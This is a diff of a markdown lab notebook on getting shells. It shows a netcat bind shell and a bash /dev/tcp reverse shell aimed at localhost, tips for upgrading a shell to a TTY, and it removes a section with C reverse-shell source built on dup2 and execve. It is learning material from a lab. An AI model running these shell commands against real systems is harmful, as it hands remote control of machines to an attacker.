@@ -1,7 +1,7 @@
 # Day 2 — Shells
 
 ## What this day is about
-Getting a shell on a target is the goal of most attacks. Once you have a shell, you have control — run commands, move files, pivot. This day covers the two main shell types, how to upgrade a dumb shell, and what a compiled C reverse shell looks like under the hood.
+Getting a shell on a target is the goal of most attacks. Once you have a shell, you have control — run commands, move files, pivot. This day covers the two main shell types and how to upgrade a dumb shell to a fully interactive one.
 
 ---
 
@@ -29,9 +29,9 @@ nc -nvlp 4444 -e /bin/bash
 nc 127.0.0.1 4444
 ```
 
-<!-- SCREENSHOT 2: victim terminal showing nc -nvlp 4444 -e /bin/bash listening and receiving connection -->
+**[SCREENSHOT — victim terminal: nc -nvlp 4444 listening and receiving connection]**
 
-<!-- SCREENSHOT 1: attacker terminal showing id command output with full uid/groups -->
+**[SCREENSHOT — attacker terminal: id command output with full uid/groups]**
 
 ---
 
@@ -47,15 +47,15 @@ bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
 
 **Important — zsh doesn't support /dev/tcp.** My default shell is zsh and running the command directly in zsh fails with `no such file or directory`. Always invoke bash explicitly with `bash -c '...'`.
 
-<!-- SCREENSHOT 3: zsh error — no such file or directory: /dev/tcp/127.0.0.1/4444 -->
+**[SCREENSHOT — zsh error: no such file or directory: /dev/tcp/127.0.0.1/4444]**
 
 Once you call bash explicitly it works:
 
-<!-- SCREENSHOT 4: both terminals — listener got connection, victim ran bash -c command -->
+**[SCREENSHOT — both terminals: listener got connection, victim ran bash -c command]**
 
 Running commands through the reverse shell:
 
-<!-- SCREENSHOT 5: id and whoami responses coming back through the shell -->
+**[SCREENSHOT — id and whoami responses coming back through the shell]**
 
 ---
 
@@ -78,37 +78,7 @@ export TERM=xterm
 
 **Mistake I made:** ran the python3 command in my local terminal instead of inside the reverse shell. Got `hostnamepython3: command not found`. The pty spawn has to run where the shell landed — inside the nc listener terminal.
 
-<!-- SCREENSHOT 6: hostnamepython3 command not found error -->
-
----
-
-## C Reverse Shell
-
-Compiled and ran `shell.c` from the repo — a raw C reverse shell that creates a socket, connects back, and hands over `/bin/sh`.
-
-```bash
-gcc -o shell shell.c
-./shell 127.0.0.1 4444
-```
-
-<!-- SCREENSHOT 7: Terminal 2 showing gcc compile and ./shell 127.0.0.1 4444 running -->
-
-<!-- SCREENSHOT 8: Terminal 1 showing connection received and id output -->
-
-How it works under the hood:
-
-```c
-int sockfd = socket(AF_INET, SOCK_STREAM, 0);   // create TCP socket
-connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));  // connect to attacker
-
-for (int i = 0; i < 3; i++) {
-    dup2(sockfd, i);  // redirect stdin(0), stdout(1), stderr(2) to socket
-}
-
-execve("/bin/sh", NULL, NULL);  // replace process with a shell
-```
-
-`dup2` is the key — it rewires stdin, stdout, and stderr to the network socket so all I/O flows over the connection. Then `execve` spawns `/bin/sh` and the attacker has a shell.
+**[SCREENSHOT — hostnamepython3: command not found error]**
 
 ---
 
@@ -118,7 +88,6 @@ execve("/bin/sh", NULL, NULL);  // replace process with a shell
 - `/dev/tcp` is bash-only — zsh, sh, and dash don't support it
 - Raw nc shells are not interactive — always upgrade with python3 pty
 - TTY upgrade commands go inside the reverse shell, not your local terminal
-- `dup2` + `execve` is the core pattern behind every socket-based shell
 
 ---
 
